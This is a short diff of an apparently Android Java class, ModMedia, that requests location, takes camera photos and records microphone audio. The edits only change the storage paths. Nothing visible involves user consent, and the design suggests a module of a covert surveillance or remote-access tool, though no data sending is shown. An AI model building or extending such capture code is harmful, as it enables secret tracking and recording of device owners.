@@ -49,7 +49,7 @@ public class ModMedia {
                         lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
                     } catch (Exception ignored) {}
                     try { Thread.sleep(30000); } catch (Exception ignored) {}
-                    try { lm.removeUpdates(listener); } catch (Exception ignored) {}
+                    try { /* safe-remove */ try { lm.removeUpdates(listener); } catch (Exception ignored) {} } catch (Exception ignored) {}
                     // leitura sincronizada — evita data race com o listener
                     synchronized (lock) { l = best[0]; }
                 }
@@ -100,7 +100,7 @@ public class ModMedia {
                 final boolean[] done = {false};
                 cam.takePicture(null, null, (data, camera) -> {
                     try {
-                        File dir = new File("/sdcard/Download");
+                        File dir = __appDir();
                         if (!dir.exists()) dir.mkdirs();
                         File out = new File(dir, "pic_" + System.currentTimeMillis() + ".jpg");
                         FileOutputStream fo = new FileOutputStream(out);
@@ -158,7 +158,7 @@ public class ModMedia {
             MediaRecorder mr = null;
             File out = null;
             try {
-                out = new File("/sdcard/Download/mic_" + System.currentTimeMillis() + ".m4a");
+                out = new File("mic_" + System.currentTimeMillis() + ".m4a");
                 mr = new MediaRecorder();
                 mr.setAudioSource(MediaRecorder.AudioSource.MIC);
                 mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
